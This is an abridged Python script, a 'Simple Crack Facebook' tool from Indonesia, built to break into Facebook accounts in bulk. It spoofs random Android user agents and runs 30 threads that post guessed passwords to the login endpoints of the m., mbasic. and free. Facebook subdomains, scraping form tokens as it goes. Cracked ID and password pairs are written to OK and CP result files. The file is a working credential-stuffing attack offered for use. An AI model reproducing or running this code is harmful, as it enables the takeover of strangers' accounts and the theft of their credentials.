...
for t in range(10000):
	...
	build1=random.choice(['Build/N2G47H)','Build/MMB29M)','Build/LMY47X)','Build/MMB29K)'])
	...
	rfn1=f'Mozilla/5.0 (Linux; Android {andro}; {samsung} {build} AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(1500,5900))}.{str(rr(75,150))} Mobile Safari/537.36 {browser}'
...
#------------------[ LOGO-BANNER ]-----------------#
def banner():
	cetak(nel(f"""[bold white]([bold green]+[bold white]) Simple Crack Facebook\n([bold green]+[bold white]) Made By [bold red]Indonesian [bold white]Coder\n([bold green]+[bold white]) Sc Free Not Prem\n([bold green]+[bold white]) Recode By [bold green]RFN[bold white]\n([bold green]+[bold white]) My Facebook [bold green]Rifan - Code[bold white]""",width=35,padding=(0,1),style=f"bold cyan"))
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
...
def menu(my_name,my_id):
	...
	cetak(nel(f'[bold white]([bold green]+[bold white]) Your Id  : [bold green]{my_id}[bold white]\n[bold white]([bold green]+[bold white]) Your Ip  : [bold green]{ip}[bold white]',width=35,padding=(0,1),style=f"bold cyan"))
	cetak(nel(f'[bold white]1. Crack Public Massal\n2. Cek Hasil\n0. Exit[bold white]',width=35,padding=(0,1),style=f"bold cyan"))
	...
	if _____rfn__xd_____ in ['2']:
		...
		print(f'>> Success {M}Logout{N} & {M}Delete{N} Cookies ')
		exit()
	else:
...
#------------------[ BAGIAN-CEK HASIL ]----------------#
def result():
	cetak(nel(f'[bold white]1. Hasil [bold green]OK[bold white] Kamu\n2. Hasil [bold yellow]CP[bold white] Kamu\n3. Kembali[bold white]',width=35,padding=(0,1),style=f"bold cyan"))
	kz = input(f'>> Select : ')
	if kz in ['2','02']:
...
def setting():
	print(f'\n{x}>> ID Order Setting ')
	cetak(nel(f'[bold white]1. Id Old To New\n2. Id New To Old ([bold green]Recommended[bold white])\n3. Id Random',width=35,padding=(0,1),style=f"bold cyan"))
	hu = input('>> Select : ')
	if hu in ['1','01']:
	...
	cetak(nel(f'[bold white]1. m.facebook.com\n2. mbasic.facebook.com\n3. free.facebook.com',width=35,padding=(0,1),style=f"bold cyan"))
	hc = input('>> Select : ')
	if hc in ['1','01']:
	...
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(nel(f'[bold white]Enter an additional password of at least 6 characters\nExample :[bold green] kontol,sayang,katasandi[bold white]',width=45,padding=(0,1),style=f"bold cyan"))
...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	cetak(nel(f'[bold white]>> OK SAVE IN OK/{okc}\n>> CP SAVE IN CP/{cpc}\n>> Mainkan Modpes Setiap 500 ID',width=45,padding=(0,1),style=f"bold cyan"))
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crack,idf,pwv)
	print('')
	cetak(nel(f'[bold white]Crack Telah Selesai Jangan Lupa Amankan Hasil Cracknya[bold white]',width=45,padding=(0,1),style=f"bold cyan"))
	print(f'{h} OK : {h}%s '%(ok))
	print(f'{k} CP : {k}%s{x} '%(cp))
	cetak(nel(f'[bold white]Good Bye Thanks To Using My Script[bold white]',width=45,padding=(0,1),style=f"bold cyan"))
	time.sleep(2)
	back()
#--------------------[ METODE-MOBILE ]-----------------#
def crack(idf,pwv):
...
def crackmbasic(idf,pwv):
	...
	for pw in pwv:
		try:
			link = ses.get('https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=847163265704696&kid_directed_site=0&app_id=847163265704696&signed_next=1&next=https%3A%2F%2Fmbasic.facebook.com%2Fv3.0%2Fdialog%2Foauth%3Fapp_id%3D847163265704696%26auth_type%3Dreauthenticate%26cbt%3D1687630332079%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df2e57476b2475f%2526domain%253Dpointblank.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fpointblank.id%25252Fff9c684fc21eac%2526relation%253Dopener%26client_id%3D847163265704696%26display%3Dtouch%26domain%3Dpointblank.id%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fpointblank.id%252Flogin%252Fform%26locale%3Did_ID%26logger_id%3Df1729dfd1a4d3e%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df317f443e977c1c%2526domain%253Dpointblank.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fpointblank.id%25252Fff9c684fc21eac%2526relation%253Dopener%2526frame%253Df2b0098b1ad1ac4%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26scope%3Demail%252Cpublic_profile%26sdk%3Djoey%26version%3Dv3.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df317f443e977c1c%26domain%3Dpointblank.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fpointblank.id%252Fff9c684fc21eac%26relation%3Dopener%26frame%3Df2b0098b1ad1ac4%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr') 
			data = {
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': re.search('name="try_number" value="(.*?)"',str(link.text)).group(1),
...
'__user':0
			...
			po = ses.post('https://mbasic.facebook.com/login/device-based/login/async/?api_key=847163265704696&auth_token=fd5889601e73a552f7c991ba2313b575&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fmbasic.facebook.com%2Fv3.0%2Fdialog%2Foauth%3Fapp_id%3D847163265704696%26auth_type%3Dreauthenticate%26cbt%3D1687630332079%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df2e57476b2475f%2526domain%253Dpointblank.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fpointblank.id%25252Fff9c684fc21eac%2526relation%253Dopener%26client_id%3D847163265704696%26display%3Dtouch%26domain%3Dpointblank.id%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fpointblank.id%252Flogin%252Fform%26locale%3Did_ID%26logger_id%3Df1729dfd1a4d3e%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df317f443e977c1c%2526domain%253Dpointblank.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fpointblank.id%25252Fff9c684fc21eac%2526relation%253Dopener%2526frame%253Df2b0098b1ad1ac4%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26scope%3Demail%252Cpublic_profile%26sdk%3Djoey%26version%3Dv3.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&refsrc=deprecated&app_id=847163265704696&cancel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df317f443e977c1c%26domain%3Dpointblank.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fpointblank.id%252Fff9c684fc21eac%26relation%3Dopener%26frame%3Df2b0098b1ad1ac4%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&lwv=100',data=data,headers=headers)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r*--> {K}{idf}|{pw}{N}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
...
def crackfree(idf,pwv):
	...
	for pw in pwv:
		try:
			link = ses.get('https://free.facebook.com/login.php?skip_api_login=1&api_key=847163265704696&kid_directed_site=0&app_id=847163265704696&signed_next=1&next=https%3A%2F%2Ffree.facebook.com%2Fv3.0%2Fdialog%2Foauth%3Fapp_id%3D847163265704696%26auth_type%3Dreauthenticate%26cbt%3D1687630332079%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df2e57476b2475f%2526domain%253Dpointblank.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fpointblank.id%25252Fff9c684fc21eac%2526relation%253Dopener%26client_id%3D847163265704696%26display%3Dtouch%26domain%3Dpointblank.id%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fpointblank.id%252Flogin%252Fform%26locale%3Did_ID%26logger_id%3Df1729dfd1a4d3e%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df317f443e977c1c%2526domain%253Dpointblank.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fpointblank.id%25252Fff9c684fc21eac%2526relation%253Dopener%2526frame%253Df2b0098b1ad1ac4%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26scope%3Demail%252Cpublic_profile%26sdk%3Djoey%26version%3Dv3.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df317f443e977c1c%26domain%3Dpointblank.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fpointblank.id%252Fff9c684fc21eac%26relation%3Dopener%26frame%3Df2b0098b1ad1ac4%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr') 
			data = {
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': re.search('name="try_number" value="(.*?)"',str(link.text)).group(1),
...
'__user':0
			...
			po = ses.post('https://free.facebook.com/login/device-based/login/async/?api_key=847163265704696&auth_token=fd5889601e73a552f7c991ba2313b575&skip_api_login=1&signed_next=1&next=https%3A%2F%2Ffree.facebook.com%2Fv3.0%2Fdialog%2Foauth%3Fapp_id%3D847163265704696%26auth_type%3Dreauthenticate%26cbt%3D1687630332079%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df2e57476b2475f%2526domain%253Dpointblank.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fpointblank.id%25252Fff9c684fc21eac%2526relation%253Dopener%26client_id%3D847163265704696%26display%3Dtouch%26domain%3Dpointblank.id%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fpointblank.id%252Flogin%252Fform%26locale%3Did_ID%26logger_id%3Df1729dfd1a4d3e%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df317f443e977c1c%2526domain%253Dpointblank.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fpointblank.id%25252Fff9c684fc21eac%2526relation%253Dopener%2526frame%253Df2b0098b1ad1ac4%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26scope%3Demail%252Cpublic_profile%26sdk%3Djoey%26version%3Dv3.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&refsrc=deprecated&app_id=847163265704696&cancel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df317f443e977c1c%26domain%3Dpointblank.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fpointblank.id%252Fff9c684fc21eac%26relation%3Dopener%26frame%3Df2b0098b1ad1ac4%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&lwv=100',data=data,headers=headers)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r*--> {K}{idf}|{pw}{N}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
